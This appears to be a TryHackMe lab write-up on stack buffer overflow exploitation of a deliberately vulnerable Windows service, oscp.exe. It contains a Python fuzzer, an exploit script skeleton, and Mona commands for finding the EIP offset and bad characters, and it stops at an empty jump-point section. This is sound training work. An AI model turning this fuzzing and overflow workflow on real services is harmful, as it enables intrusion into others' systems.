# Buffer Overflow Prep
* Win7 VM with Immunity Debugger and PuTTY installed.
* Login over RDP using xfreerdp.
```
xfreerdp /u:admin /p:password /cert-ignore /v:TARGET_IP /workarea
```
* Choose "Home" option if Windows prompts for network location.
* [Exploiting buffer overflows cheat sheet](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)
## "oscp.exe" Overflow
* Right-click "Immunity Debugger" > "Run as administrator".
  
![image](https://github.com/clydebuilt1974/TryHackMe/assets/157394432/7397a66c-46cc-4cc5-8446-223595d3fb85)

* "File" > "Open" > navigate to "vulnerable-apps" folder > "oscp" folder > "oscp.exe" > "Open".
* "Debug" > "Run".
* oscp.exe binary runs in terminal window.
  
![image](https://github.com/clydebuilt1974/TryHackMe/assets/157394432/ea00975e-21b2-4bea-915c-f1631601fed0)
* Connect to port 1337 using netcat on attack host.
```
nc TARGET_IP 1337
Welcome to OSCP Vulnerable Server! Enter HELP for help.
HELP
Valid Commands:
HELP
OVERFLOW1 [value]
[...snip...]
EXIT
```
* Choose "OVERFLOW 1 test".
```
OVERFLOW1 test
OVERFLOW1 COMPLETE
```
* Terminate netcat connection.

### Mona Configuration
* Configure Mona working folder.
* Run command in input box at bottom of Immunity Debugger window.
```
!mona config -set workingfolder c:\mona\%p
```

![image](https://github.com/clydebuilt1974/TryHackMe/assets/157394432/7fc8e531-7e2a-4cac-9cc7-7d455c5306f5)

### Fuzzing
* Create "fuzzer.py" file on attack host.
```
#!/usr/bin/env python3

import socket, time, sys

ip = "TARGET_IP"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```
* Run script using pthon.
```
python3 fuzzer.py
```
* Script sends increasingly long strings comprised of As.
* Fuzzer exits with error message if it crashes target host with one of the strings.
* Note largest number of bytes that were sent.
  * Fuzzing with 1900 bytes succeeded.
  * Fuzzing crashed at 2000 bytes.

### Crash Replication and Controlling EIP
* Create "exploit.py" file on attack host.
```
import socket

ip = "TARGET_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
* Generate cyclic pattern of length 400 bytes longer than string that crashed the server.
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
```
  * `-l` value specifes number of bytes.
* Place output into "payload "variable of "exploit.py" script.
* Re-open "oscp.exe" binary in Immunity Debugger on target host > click red play icon to run it.

![image](https://github.com/clydebuilt1974/TryHackMe/assets/157394432/6e9f3fb9-ac68-4da9-a0a7-51b8b8ae024b)

* Run modified "exploit.py" script on attack host.
```
python3 exploit.py
Sending evil buffer...
Done!
```
* Script crashes oscp server.
* Run mona command in Immunity Debugger command input box.
```
!mona findmsp -distance 2400
```
  * `-distance` is length of cyclic pattern.

![image](https://github.com/clydebuilt1974/TryHackMe/assets/157394432/0d739081-4f54-4c4e-a326-f9ad77a6689d)

* Output displays EIP offset.
```
EIP contains normal pattern : 0x6f43396e (offset 1978)
```
* Update "exploit.py" script.
  * Set "offset" variable to 1978.
  * Set "payload" variable to empty string.
  * Set "retn" variable to "BBBB".
* Re-open "oscp.exe" binary in Immunity Debugger on target host > click red play icon to run it.
* Run modified "exploit.py" script.
* EIP register now overwritten with the 4 Bs - hex 42424242.

![image](https://github.com/clydebuilt1974/TryHackMe/assets/157394432/b4999318-b3a8-43c9-8701-5cea15616d49)

### Finding Bad Characters
* Generate bytearray using mona.
  * Exclude null byte (`\x00`) by default.
```
!mona bytearray -b "\x00"
```

![image](https://github.com/clydebuilt1974/TryHackMe/assets/157394432/c79c567e-e342-464b-9d21-ec26b68a4b1f)

* Location of "bytearray.bin" is "c:\mona\oscp\bytearray.bin".
* Generate string of bad characters identical to bytearray.
  * Python script generates string of bad chars from `\x01` to `\xff`.
```
for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')
print()
```
* Set "payload" variable of "exploit.py" script to string of bad characters generated by script.
* Re-open "oscp.exe" binary in Immunity Debugger on target host > click red play icon to run it.
* Run modified "exploit.py" script.
* Note what address ESP register points to in "Registers" window.

![image](https://github.com/clydebuilt1974/TryHackMe/assets/157394432/b47ca552-540c-4c25-80ba-f0f8f0f9f4dd)

* Add address to mona comparison command.
```
!mona compare -f c:\mona\oscp\bytearray.bin -a 0190fa30
```

![image](https://github.com/clydebuilt1974/TryHackMe/assets/157394432/6b5dab08-1c13-465e-b050-279f2872b703)
* Window shows result of comparison and any characters different in memory to those generated by "bytearray.bin" binary.
* Not all of these might be badchars!
  * Sometimes badchars cause next byte to get corrupted too - or even affect the rest of the string.
* First badchar in list is null byte (`\x00`) as this was excluded from "bytearray.bin" file.
  * Note the other possible badchars (07 08 2e 2f a0 a1).
* Restart "oscp.exe" in Immunity.
* Generate new bytearray in mona specifying the identified badchar and null byte.
```
!mona bytearray -b "\x00\x07"
```
* Remove `\x07` character from "payload" variable in "exploit.py" script.
* Run modified "exploit.py" script.
* Compare using mona.
  * ESP = 0195fa30
*
*
*    until results status returns "Unmodified".
  * This indicates no more badchars exist.

### Finding a Jump Point
